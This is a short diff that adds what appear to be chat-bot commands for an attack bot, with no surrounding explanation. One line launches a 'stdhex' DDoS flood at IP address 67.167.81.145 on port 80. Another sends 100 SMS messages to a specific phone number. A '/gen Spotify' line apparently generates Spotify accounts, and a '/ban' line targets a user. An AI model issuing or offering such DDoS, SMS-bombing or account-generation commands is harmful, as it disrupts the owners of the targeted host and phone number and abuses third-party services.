@@ -1,0 +1,7 @@
+/gen Spotify
+/help
+/ddos stdhex 67.167.81.145 120 80
+/help
+/sms
+/sms 13319981974 100
+/ban <@318822153677963264>
